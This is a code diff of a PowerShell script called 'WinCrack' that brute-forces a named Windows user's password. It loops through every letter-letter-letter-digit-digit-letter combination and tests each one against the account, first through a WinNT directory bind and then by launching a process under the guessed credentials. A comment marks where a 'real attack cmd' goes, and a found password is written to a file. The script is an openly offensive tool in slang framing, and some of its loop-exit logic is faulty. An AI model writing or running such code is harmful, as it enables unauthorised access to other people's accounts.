@@ -1,43 +1,53 @@
-# ===============================
-# 💚 Sigma WinCrack LLLNNL v1 💚
-# ===============================
-
-[console]::Title = "WinCrack - Sigma LLLNNL Generator"
+# =========================
+# SIGMA LLLNNL WINCRACK
+# =========================
+[console]::Title = "WinCrack"
 [console]::ForegroundColor = 'green'
 
-function WinCrack {
-    $domain = Read-Host "Domain (or COMPUTERNAME if local)"
-    $user = Read-Host "Target Username"
+# --- CONFIG ---
+$domain = Read-Host "Domain (e.g., MY-PC)"
+$user = Read-Host "Username (opps to clap)"
+$letters = 'a'..'z'
+$numbers = 0..9
+$found = $false
+$saveFile = "sigma_rizz.txt"  # saves the password when found
 
-    $letters = 'a'..'z'
-    $numbers = 0..9
-    $found = $false
+function Try-Crack {
+    param($username, $password, $domain)
 
-    Write-Host "[START] Beginning LLLNNL gyat scan for $user on $domain"
+    try {
+        $ps = New-Object System.Diagnostics.ProcessStartInfo
+        $ps.FileName = "whoami.exe"   # dummy command, real attack cmd goes here
+        $ps.UseShellExecute = $false
+        $ps.UserName = $username
+        $ps.Password = (ConvertTo-SecureString $password -AsPlainText -Force)
+        $ps.Domain = $domain
+        [System.Diagnostics.Process]::Start($ps) | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
+}
 
-    foreach ($l1 in $letters) {
-        foreach ($l2 in $letters) {
-            foreach ($l3 in $letters) {
-                foreach ($n1 in $numbers) {
-                    foreach ($n2 in $numbers) {
-                        foreach ($l4 in $letters) {
-                            $pwd = "$l1$l2$l3$n1$n2$l4"
+Write-Host "`n[!] Starting sigma grind on $user@$domain" -ForegroundColor Yellow
 
-                            try {
-                                # attempt login using DirectoryEntry
-                                $de = New-Object System.DirectoryServices.DirectoryEntry("WinNT://$domain/$user,user",$user,$pwd)
-                                $null = $de.psbase.Invoke("IsAccountLocked")  # throws if wrong
-
-                                Write-Host "[CLAP] Password found: $pwd" -ForegroundColor Green
-
-                                # save the rizz so you never grind again
-                                "$user : $pwd" | Out-File -FilePath "$env:USERPROFILE\Desktop\rizz.txt" -Append
-
-                                $found = $true
-                                break
-                            } catch {}
+foreach ($l1 in $letters) {
+    foreach ($l2 in $letters) {
+        foreach ($l3 in $letters) {
+            foreach ($n1 in $numbers) {
+                foreach ($n2 in $numbers) {
+                    foreach ($l4 in $letters) {
+                        $combo = "$l1$l2$l3$n1$n2$l4"
+                        Write-Host "Trying combo: $combo" -NoNewline
+                        
+                        if (Try-Crack -username $user -password $combo -domain $domain) {
+                            Write-Host " ✅ CLAPPED! Password found: $combo" -ForegroundColor Green
+                            $combo | Out-File -FilePath $saveFile -Encoding utf8
+                            $found = $true
+                            break 6  # exit all loops immediately
+                        } else {
+                            Write-Host " ❌ failed" -ForegroundColor Cyan
                         }
-                        if ($found) { break }
                     }
                     if ($found) { break }
                 }
@@ -47,8 +57,11 @@ function WinCrack {
         }
         if ($found) { break }
     }
-
-    if (-not $found) { Write-Host "[FAIL] Could not find password with LLLNNL formula." -ForegroundColor Red }
+    if ($found) { break }
 }
 
-while ($true) { WinCrack }
+if (-not $found) {
+    Write-Host "`n[!] Sigma grind complete, no gyat clapped..." -ForegroundColor Red
+} else {
+    Write-Host "`n[!] Rizz saved in $saveFile" -ForegroundColor Green
+}
